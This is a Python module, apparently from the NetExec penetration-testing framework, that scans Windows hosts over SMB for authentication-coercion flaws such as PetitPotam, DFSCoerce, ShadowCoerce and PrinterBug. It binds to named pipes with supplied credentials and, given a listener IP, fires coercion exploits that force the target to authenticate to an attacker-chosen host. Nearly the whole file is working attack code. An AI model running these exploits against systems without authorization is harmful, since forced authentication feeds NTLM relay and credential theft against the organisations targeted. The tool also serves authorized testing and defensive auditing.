import nxc

from os.path import dirname
from os.path import join as path_join

from nxc.paths import NXC_PATH
from nxc.loaders.moduleloader import ModuleLoader

from impacket.uuid import uuidtup_to_bin, bin_to_string
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT


class NXCModule:
    name = "coerce_plus"
    description = "Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.listener = None
        self.always_continue = None
        self.method = "all"

        self.method_paths = [
            path_join(dirname(nxc.__file__), "modules", "coerce_plus_method"),
            path_join(NXC_PATH, "modules", "coerce_plus_method"),
        ]
        self.method_modules = ModuleLoader.load_all_modules_from_subdirs(self.method_paths)

    def options(self, context, module_options):
        """
        LISTENER       LISTENER for exploitation (default: 127.0.0.1)
        ALWAYS         Always continue to all exploit (default: False)
        METHOD         Exploit method (Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven, All   default: All)
        M              Alias for METHOD
        L              Alias for LISTENER
        """
        self.listener = None
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]
        if "L" in module_options:
            self.listener = module_options["L"]
        if "ALWAYS" in module_options:
            self.always_continue = True
        if "METHOD" in module_options:
            self.method = module_options["METHOD"].lower()
        if "M" in module_options:
            self.method = module_options["M"].lower()

    def on_login(self, context, connection):
        target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
        Coercer_ = Coercer(context, self.method_modules)
        protocol_config, aliasName = Coercer_.config()
        for ms_protocolName, coerce_methods in protocol_config.items():
            accessible_Pipe = []
            for coerce_method in coerce_methods:
                try:
                    dce = Coercer_.connect(
                        username=connection.username,
                        password=connection.password,
                        domain=connection.domain,
                        lmhash=connection.lmhash,
                        nthash=connection.nthash,
                        target=target,
                        doKerberos=connection.kerberos,
                        dcHost=connection.kdcHost,
                        aesKey=connection.aesKey,
                        coerce_method=coerce_method
                    )
                    if dce is not None:
                        accessible_Pipe.append(coerce_method["pipeName"])
                        if self.listener is not None:  # exploit
                            Coercer_.exploit(
                                dce=dce,
                                target=target,
                                listener=self.listener,
                                always_continue=self.always_continue,
                                ms_protocolName=ms_protocolName,
                                exploitName=aliasName[ms_protocolName],
                                pipeName=coerce_method["pipeName"]
                            )
                        dce.disconnect()
                    else:
                       context.log.debug(f'{ms_protocolName}: PIPE: {coerce_method["pipeName"]} is not accessible on target: {target}')
                except Exception as e:
                    context.log.error(f"Error: {e}")

            if accessible_Pipe:
                context.log.highlight(f'{aliasName[ms_protocolName]}: Accessible PIPE: {accessible_Pipe}')


class Coercer:
    def __init__(self, context, methods):
        self.context = context
        self.methods = methods
        self.timeout = 2

    def config(self):
        alias = {
            "MS_FSRVP": "ShadowCoerce",
            "MS_DFSNM": "DFSCoerce",
            "MS_EFSR": "Petitpotam",
            "MS_RPRN": "PrinterBug",
            "MS_EVEN": "CheeseOunce",
            "MS_WSP": "WSPCoerce"
        }
        config = {
            "MS_FSRVP": [
                {
                    "protocol": "ncacn_np",
                    "pipeName":  "Fssagentrpc",
                    "MSRPC_UUID": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
                },
            ],
            "MS_DFSNM": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "netdfs",
                    "MSRPC_UUID": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
                }
            ],
            "MS_EFSR": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "lsarpc",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "efsrpc",
                    "MSRPC_UUID": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "samr",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "lsass",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "netlogon",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                }
            ],
            "MS_RPRN": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "spoolss",
                    "MSRPC_UUID": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                },
                {
                    "protocol": "ncacn_ip_tcp",
                    "pipeName": "[dcerpc]",
                    "MSRPC_UUID": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                },
            ],
            "MS_EVEN": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "eventlog",
                    "MSRPC_UUID": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
                },
            ],
            "MS_WSP": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "MsFteWds",
                    "MSRPC_UUID": "",
                }
            ]
        }
        return config, alias

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, coerce_method):
        if coerce_method["protocol"] == "ncacn_np":
            stringBinding = f'{coerce_method["protocol"]}:{target}[\\PIPE\\{coerce_method["pipeName"]}]'
        elif coerce_method["protocol"] == "ncacn_ip_tcp":
            stringBinding = epm.hept_map(target, uuidtup_to_bin(coerce_method["MSRPC_UUID"]), protocol="ncacn_ip_tcp")

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.setRemoteHost(target)
        rpctransport.set_connect_timeout(self.timeout)
        rpctransport.set_credentials(
            username=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash,
            aesKey=aesKey,
        )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_GSS_NEGOTIATE if doKerberos else RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        self.context.log.debug(f"Connecting to {stringBinding}")
        try:
            dce.connect()
            if coerce_method["MSRPC_UUID"]:
                dce.bind(uuidtup_to_bin(coerce_method["MSRPC_UUID"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong when connect to {stringBinding}, check error status => {e!s}")
            return None
        self.context.log.debug(f"[+] Successfully bound to {stringBinding}!")
        return dce
    
    def exploit(self, dce, target, listener, always_continue, ms_protocolName, exploitName, pipeName):
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == ms_protocolName:
                self.context.log.debug(f"Target: {target}: Sending {CoerceMethod}!")
                try:
                    method.request(dce, target, listener)
                except Exception as e:
                    self.handle_exception(CoerceMethod, exploitName, pipeName, always_continue, e)
                else:
                    # For wspcoerce, it won't return rpc error when it success.
                    self.context.log.highlight(f"{exploitName}: Exploit Success, {pipeName}\\{CoerceMethod}")
    
    def handle_exception(self, CoerceMethod, exploitName, pipeName, always_continue, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{exploitName}: Exploit Success with {CoerceMethod} method")
            self.context.log.highlight(f"{exploitName}: Exploit Success, {pipeName}\\{CoerceMethod}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug(f"{exploitName}: Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")